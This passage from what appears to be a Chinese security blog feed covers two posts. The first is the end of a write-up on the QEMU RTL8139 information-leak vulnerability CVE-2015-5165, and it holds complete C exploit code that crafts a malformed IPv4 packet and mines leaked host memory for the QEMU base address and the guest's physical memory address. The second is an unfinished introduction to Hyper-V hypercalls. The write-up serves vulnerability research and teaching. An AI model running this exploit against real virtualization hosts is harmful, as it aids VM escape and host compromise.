class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// SRC MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x00</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x57</span>, </span><br><span class="line">    <span class="comment">// Length / Type: IPv4</span></span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Ethernet Frame Payload 数据, 即 IPv4 数据包</span></span><br><span class="line">    <span class="comment">// Version &amp; IHL(Internet Header Length)</span></span><br><span class="line">    (<span class="number">0x04</span> &lt;&lt; <span class="number">4</span>) | <span class="number">0x05</span>,    <span class="comment">// 0x05 * 4 = 20 bytes</span></span><br><span class="line">    <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Total Length = 0x13 = 19 bytes</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x13</span>,     <span class="comment">// 19 - 20 = -1 = 0xFFFF, trigger vulnerability</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Identification</span></span><br><span class="line">    <span class="number">0x40</span>, <span class="number">0x00</span>,     <span class="comment">// Flags &amp; Fragment Offset</span></span><br><span class="line">    <span class="number">0x40</span>,           <span class="comment">// TTL</span></span><br><span class="line">    <span class="number">0x06</span>,           <span class="comment">// Protocol: TCP</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Header checksum</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Source IP: 127.0.0.1</span></span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="comment">// Destination IP: 127.0.0.1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// IP Packet Payload 数据, 即 TCP 数据包</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Source Port</span></span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0xef</span>,     <span class="comment">// Destination Port</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Sequence Number</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="comment">// Acknowledgement Number</span></span><br><span class="line">    <span class="number">0x50</span>,           <span class="comment">// 01010000, Header Length = 5 * 4 = 20</span></span><br><span class="line">    <span class="number">0x10</span>,           <span class="comment">// 00010000, ACK</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// Window Size</span></span><br><span class="line">    <span class="number">0xde</span>, <span class="number">0xad</span>,     <span class="comment">// TCP checksum</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>      <span class="comment">// Urgent Pointer</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> get_physical_pfn(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = <span class="number">-1</span>;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/proc/self/pagemap"</span>, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> (!fp) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> pfn;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">    &#123;</span><br><span class="line">        fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">        <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">        &#123;</span><br><span class="line">            pfn &amp;= PFN_PFN;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> pfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> gva_to_gpa(<span class="keyword">void</span>* addr) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pfn = get_physical_pfn(addr);</span><br><span class="line">    <span class="keyword">return</span> pfn * PAGE_SIZE + (<span class="keyword">uint64_t</span>)addr % PAGE_SIZE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(rtl8139_ring* ring, rtl8139_desc* desc, <span class="keyword">size_t</span> nb)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> buffer_size = RTL8139_BUFFER_SIZE + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;desc[i], <span class="number">0</span>, <span class="keyword">sizeof</span>(desc[i]));</span><br><span class="line">        ring[i].desc = &amp;desc[i];</span><br><span class="line">        </span><br><span class="line">        ring[i].buffer = aligned_alloc(PAGE_SIZE, buffer_size);</span><br><span class="line">        <span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, buffer_size);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// descriptor owned by NIC 准备接收数据</span></span><br><span class="line">        ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line">        <span class="keyword">if</span> (i == nb - <span class="number">1</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            ring[i].desc-&gt;dw0 |= CP_RX_EOR; <span class="comment">// End of Ring</span></span><br><span class="line">        &#125;</span><br><span class="line">        ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">        ring[i].desc-&gt;dw0 |= buffer_size;   <span class="comment">// buffer_size</span></span><br><span class="line">        ring[i].desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Rx descriptors address</span></span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_tx</span><span class="params">(rtl8139_desc* desc, <span class="keyword">void</span>* buffer)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(rtl8139_desc));</span><br><span class="line">    desc-&gt;dw0 |= CP_TX_OWN |    <span class="comment">// descriptor owned by NIC 准备发送数据</span></span><br><span class="line">                 CP_TX_EOR |</span><br><span class="line">                 CP_TX_LS |</span><br><span class="line">                 CP_TX_LGSEN |</span><br><span class="line">                 CP_TX_IPCS |</span><br><span class="line">                 CP_TX_TCPCS;</span><br><span class="line">    desc-&gt;dw0 += RTL8139_BUFFER_SIZE;</span><br><span class="line">    desc-&gt;buf_lo = (<span class="keyword">uint32_t</span>)gva_to_gpa(buffer);</span><br><span class="line">    outl((<span class="keyword">uint32_t</span>)gva_to_gpa(desc), RTL8139_PORT + TxAddr0);</span><br><span class="line">    outl(<span class="number">0</span>, RTL8139_PORT + TxAddr0 + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_card_config</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 触发漏洞需要设置的一些参数</span></span><br><span class="line">    outl(TxLoopBack, RTL8139_PORT + TxConfig);</span><br><span class="line">    outl(AcceptMyPhys, RTL8139_PORT + RxConfig);</span><br><span class="line">    outw(CPlusRxEnb | CPlusTxEnb, RTL8139_PORT + CpCmd);</span><br><span class="line">    outb(CmdRxEnb | CmdTxEnb, RTL8139_PORT + ChipCmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_packet_send</span><span class="params">(<span class="keyword">void</span>* buffer, <span class="keyword">void</span>* packet, <span class="keyword">size_t</span> len)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (len &lt;= RTL8139_BUFFER_SIZE) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(buffer, packet, len);</span><br><span class="line">        outb(CPlus, RTL8139_PORT + TxPoll);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxd</span><span class="params">(<span class="keyword">uint8_t</span>* ptr, <span class="keyword">size_t</span> size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; size; ++i, ++j) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span> == <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n0x%08x: "</span>, ptr + i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%02x "</span>, ptr[i]);</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">7</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"- "</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> scan_leaked_chunks(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count,</span><br><span class="line">                          <span class="keyword">size_t</span> chunk_size, <span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> chunk_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Ethernet Frame Header: 14 +</span></span><br><span class="line">        <span class="comment">// IP Header: 20 +</span></span><br><span class="line">        <span class="comment">// TCP Header: 20 = 54</span></span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> size = *(<span class="keyword">uint64_t</span>*)ptr &amp; CHUNK_SIZE_MASK;</span><br><span class="line">            <span class="keyword">if</span> (size == chunk_size) </span><br><span class="line">            &#123;</span><br><span class="line">                chunks[count++] = (<span class="keyword">void</span>*)(ptr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (count &gt; chunk_count) </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_module_base_addr(<span class="keyword">void</span>** chunks, <span class="keyword">size_t</span> count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> property_get_bool_offset = <span class="number">0x377F66</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0x00000FFF</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span>* ptr = (<span class="keyword">uint64_t</span>*)chunks[i] + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> ((*ptr &amp; mask) == (property_get_bool_offset &amp; mask)) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"property_get_bool: 0x%"</span> PRIx64 <span class="string">"\n"</span>, *ptr);</span><br><span class="line">            <span class="keyword">return</span> *ptr - property_get_bool_offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> leak_physical_memory_addr(rtl8139_ring* ring, <span class="keyword">size_t</span> ring_count) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> mask = <span class="number">0xffff000000</span>ull;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="built_in">array</span>[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="keyword">size_t</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">array</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">array</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; ring_count; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span>* ptr = (<span class="keyword">uint8_t</span>*)ring[i].buffer + <span class="number">56</span>;</span><br><span class="line">        <span class="keyword">uint8_t</span>* end = (<span class="keyword">uint8_t</span>*)ring[i].buffer + RTL8139_BUFFER_SIZE / <span class="number">4</span> * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">while</span> (ptr &lt; end - <span class="number">8</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint64_t</span> value = *(<span class="keyword">uint64_t</span>*)ptr;</span><br><span class="line">            <span class="keyword">if</span> (((value &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>) == <span class="number">0x7f</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                value = (value &amp; mask) &gt;&gt; <span class="number">24</span>;</span><br><span class="line">                <span class="built_in">array</span>[value]++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">array</span>[value] &gt; <span class="built_in">array</span>[index]) </span><br><span class="line">                &#123;</span><br><span class="line">                    index = value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ptr += <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> memory_size = <span class="number">0x80000000</span>;</span><br><span class="line">    <span class="keyword">return</span> (((<span class="keyword">uint64_t</span>)index | <span class="number">0x7f0000</span>) &lt;&lt; <span class="number">24</span>) - memory_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 44 * RTL8139_BUFFER_SIZE = 44 * 1514 = 66616</span></span><br><span class="line">    <span class="comment">// 可以收完 65535 字节数据</span></span><br><span class="line">    <span class="keyword">size_t</span> rtl8139_rx_nb = <span class="number">44</span>;</span><br><span class="line">    rtl8139_ring* rtl8139_rx_ring = (rtl8139_ring*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_ring));</span><br><span class="line">    rtl8139_desc* rtl8139_rx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, rtl8139_rx_nb * <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    rtl8139_desc* rtl8139_tx_desc = (rtl8139_desc*)aligned_alloc(</span><br><span class="line">        PAGE_SIZE, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line">    <span class="keyword">void</span>* rtl8139_tx_buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// change I/O privilege level</span></span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// initialize Rx ring, Rx descriptor, Tx descriptor</span></span><br><span class="line">    rtl8139_desc_config_rx(rtl8139_rx_ring, rtl8139_rx_desc, rtl8139_rx_nb);</span><br><span class="line">    rtl8139_desc_config_tx(rtl8139_tx_desc, rtl8139_tx_buffer);</span><br><span class="line">    rtl8139_card_config();</span><br><span class="line">    rtl8139_packet_send(rtl8139_tx_buffer, rtl8139_packet, </span><br><span class="line">                        <span class="keyword">sizeof</span>(rtl8139_packet));</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// print leaked data</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; rtl8139_rx_nb; ++i) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// RTL8139_BUFFER_SIZE 之后 4 字节数据为 Checksum</span></span><br><span class="line">        <span class="comment">// 不打印也无所谓了</span></span><br><span class="line">        xxd((<span class="keyword">uint8_t</span>*)rtl8139_rx_ring[i].buffer, RTL8139_BUFFER_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// exploit</span></span><br><span class="line">    <span class="keyword">void</span>* chunks[CHUNK_COUNT] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">size_t</span> chunk_count = scan_leaked_chunks(rtl8139_rx_ring, rtl8139_rx_nb, </span><br><span class="line">                                            <span class="number">0x60</span>, chunks, CHUNK_COUNT);</span><br><span class="line">    <span class="keyword">uint64_t</span> module_addr = leak_module_base_addr(chunks, chunk_count);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"qemu-system-x86_64: 0x%"</span> PRIx64 <span class="string">"\n"</span>, module_addr);</span><br><span class="line">    <span class="keyword">uint64_t</span> physical_memory_addr = leak_physical_memory_addr(</span><br><span class="line">        rtl8139_rx_ring, rtl8139_rx_nb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"physical memory address: 0x%"</span> PRIx64 <span class="string">"\n"</span>, physical_memory_addr);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> free heap blocks</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exploit 测试结果如下：</p><p><img src="/uploads/202006/cve-2015-5165-exploit.png" alt="QEMU 漏洞 CVE-2015-5165 Exploit"></p><h2 id="0x05-分析小结"><a href="#0x05-分析小结" class="headerlink" title="0x05. 分析小结"></a>0x05. 分析小结</h2><p>第一次分析 QEMU 的漏洞，整体感觉还挺有意思的，CVE-2015-5165 这个漏洞本身简单易懂，如果了解网卡基本工作原理的话，Exploit 编写也不是很难。</p><h2 id="0x06-参考文献"><a href="#0x06-参考文献" class="headerlink" title="0x06. 参考文献"></a>0x06. 参考文献</h2><p>[1] <a href="http://www.phrack.org/papers/vm-escape-qemu-case-study.html" target="_blank" rel="noopener">http://www.phrack.org/papers/vm-escape-qemu-case-study.html</a></p><p>[2] <a href="http://patchwork.ozlabs.org/project/qemu-devel/patch/20161228200433.24244-1-cov@codeaurora.org/" target="_blank" rel="noopener">QEMU commands-posix.c patch - &lt;sys/sysmacros.h&gt;</a></p><p>[3] <a href="https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/" target="_blank" rel="noopener">https://dangokyo.me/2018/03/02/qemu-escape-part-1-environment-set-up/</a></p><p>[4] <a href="https://www.realvnc.com/en/connect/download/viewer/" target="_blank" rel="noopener">https://www.realvnc.com/en/connect/download/viewer/</a></p><p>[5] <a href="https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/" target="_blank" rel="noopener">https://shanetully.com/2014/12/translating-virtual-addresses-to-physcial-addresses-in-user-space/</a></p><p>[6] <a href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/vm/pagemap.txt</a></p><p>[7] TCP/IP Illustrated, Volum 1, The protocols, Second Edition, Kevin R. Fall, W. Richard Stevens</p><p>[8] <a href="http://realtek.info/pdf/rtl8139cp.pdf" target="_blank" rel="noopener">http://realtek.info/pdf/rtl8139cp.pdf</a></p><p>[9] <a href="https://www.anquanke.com/post/id/197637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197637</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 Phrack 文章 &lt;strong&gt;&lt;em&gt;VM escape - QEMU Case Study&lt;/em&gt;&lt;/strong&gt; [1] 对 QEMU 信息泄露漏洞 CVE-2015-5165 和堆溢出漏洞 CVE-2015-7504 进行调试分析并编写 Exploit 代码，本文主要分析其中的 RTL8139 网卡信息泄露漏洞 CVE-2015-5165。&lt;/p&gt;
    
    </summary>
    
      <category term="Virtualization" scheme="http://programlife.net/categories/Virtualization/"/>
    
      <category term="QEMU" scheme="http://programlife.net/categories/Virtualization/QEMU/"/>
    
    
      <category term="QEMU" scheme="http://programlife.net/tags/QEMU/"/>
    
      <category term="RTL8139" scheme="http://programlife.net/tags/RTL8139/"/>
    
      <category term="CVE-2015-5165" scheme="http://programlife.net/tags/CVE-2015-5165/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to Hypercall</title>
    <link href="http://programlife.net/2020/05/20/introduction-to-hypercall/"/>
    <id>http://programlife.net/2020/05/20/introduction-to-hypercall/</id>
    <published>2020-05-20T00:13:37.000Z</published>
    <updated>2020-05-20T14:33:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hyper-V Hypercall 相关基础知识介绍。</p><a id="more"></a><h2 id="0x01-Hypercall-介绍"><a href="#0x01-Hypercall-介绍" class="headerlink" title="0x01. Hypercall 介绍"></a>0x01. Hypercall 介绍</h2><p>Hypercall 用于从虚拟机到 Hypervisor 的状态切换，就像 System Call 用于从用户态到内核态的状态切换一样。</p><h3 id="1-1-Hypercall-Classes"><a href="#1-1-Hypercall-Classes" class="headerlink" title="1.1 Hypercall Classes"></a>1.1 Hypercall Classes</h3><p>Hypercall 可以分为两种不同的类型：简单类型（<strong>Simple</strong>）和重复类型（<strong>Repeat / Rep</strong>）。</p><ul><li>Simple Hypercall 拥有固定大小的输入和输出参数，执行一个单一的操作</li><li>Repeat Hypercall 可以看成是由一系列 Simple Hypercall 组成的</li></ul><p>在发起 Repeat Hypercall 时，调用方需要指明输入输出参数的组数（<em>rep count</em>），以及将要被处理的输入输出参数的索引数（<em>rep start index</em>）；Hypervisor 将按照顺序处理对应的数据。</p><h3 id="1-2-Hypercall-Continuation"><a href="#1-2-Hypercall-Continuation" class="headerlink" title="1.2 Hypercall Continuation"></a>1.2 Hypercall Continuation</h3><p>Hypervisor 会限制 Hypercall 的执行时间在 <code>50μs</code> 以内，超过该时间限制的 Hypercall 依赖于一种叫做 Hypercall Continuation 的机制来完成，该机制对调用方而言基本是透明的。</p><p>对于无法在 <code>50μs</code> 的时间限制内完成的 Hypercall，当控制权从 Hypervisor 返回到虚拟机之后，对应的 RIP 寄存器的值并不会改变；当对应的线程再次获得执行机会时，原有的 Hypercall 会被继续执行。显然，在 Hypercall 完成执行的过程中需要维护一个状态，类似 Repeat Hypercall 的执行一样。</p><h3 id="1-3-Hypercall-Atomicity-and-Ordering"><a href="#1-3-Hypercall-Atomicity-and-Ordering" class="headerlink" title="1.3 Hypercall Atomicity and Ordering"></a>1.3 Hypercall Atomicity and Ordering</h3><p>一般来说，Hypercall 的执行是原子的：Simple Hypercall 就是单个的原子操作，Repeat Hypercall 则是一系列的原子操作；对于无法一次执行完毕的 Hypercall（即超过 <code>50μs</code> 时间限制的 Hypercall），则由多个原子操作所组成。</p><h3 id="1-4-Hypercall-Inputs"><a href="#1-4-Hypercall-Inputs" class="headerlink" title="1.4 Hypercall Inputs"></a>1.4 Hypercall Inputs</h3><p>对于任意的 Hypercall，必然至少有一个输入参数，因为肯定需要指定一个编号。在 x64 环境下，该参数通过 <code>RCX</code> 寄存器传递，对应的数据格式如下：</p><p><img src="/uploads/202005/hypercall-input-rcx.png" alt="Hyper-v Hypercall RCX 参数格式"></p><p>对应的说明如下：</p><table><thead><tr><th>字段</th><th>宽度</th><th>含义</th></tr></thead><tbody><tr><td>Call code</td><td>16 bits</td><td>Hypercall 的编号</td></tr><tr><td>Fast</td><td>1 bit</td><td>0 表示基于内存的调用约定，1 表示基于寄存器的调用约定</td></tr><tr><td>Variable header size</td><td>9 bits</td><td>Variable Headr 的大小</td></tr><tr><td>RsvdZ</td><td>5 bits</td><td>必须是 0</td></tr><tr><td>Is Nested</td><td>1 bit</td><td>0 表示由 Guest Hypervisor 处理，1 表示由 L0 Hypervisor 处理</td></tr><tr><td>Rep Count</td><td>12 bits</td><td>Repeat Hypercall 的重复次数（Simple Hypercall 必须是 0）</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>必须是 0</td></tr><tr><td>Rep Start Index</td><td>12 bits</td><td>Repeat Hypercall 的索引值（Simple Hypercall 必须是 0）</td></tr><tr><td>RsvdZ</td><td>4 bits</td><td>必须是 0</td></tr></tbody></table><p>如果 Fast 的值为 0，那么 <code>RDX</code> 寄存器可以用于传递输入参数的 GPA（Guest Physical Address），<code>R8</code> 寄存器可以用于传递输出参数的 GPA。</p><p>如果 Fast 的值为 1，那么 <code>RDX</code> 和 <code>R8</code> 寄存器可以用于传递输入参数。</p><p>如果 Hypervisor 支持 Extended Fast Hypercalls，那么还可以使用 XMM 寄存器来传递输入参数，最多支持 <code>112</code> 字节的数据：XMM0 ~ XMM5 共 <code>16 * 6 = 96</code> 字节，以及 <code>RDX</code> 和 <code>R8</code> 共 <code>16</code> 字节。</p><h3 id="1-5-Hypercall-Outputs"><a href="#1-5-Hypercall-Outputs" class="headerlink" title="1.5 Hypercall Outputs"></a>1.5 Hypercall Outputs</h3><p>Hypercall 的返回值通过 <code>RAX</code> 寄存器传递，对应的数据格式如下：</p><p><img src="/uploads/202005/hypercall-output-rax.png" alt="Hyper-v Hypercall RAX 参数格式"></p><p>对应的说明如下：</p><table><thead><tr><th>字段</th><th>宽度</th><th>含义</th></tr></thead><tbody><tr><td>Result</td><td>16 bits</td><td>HV_STATUS code</td></tr><tr><td>Rsvd</td><td>16 bits</td><td>保留字段</td></tr><tr><td>Reps completed</td><td>12 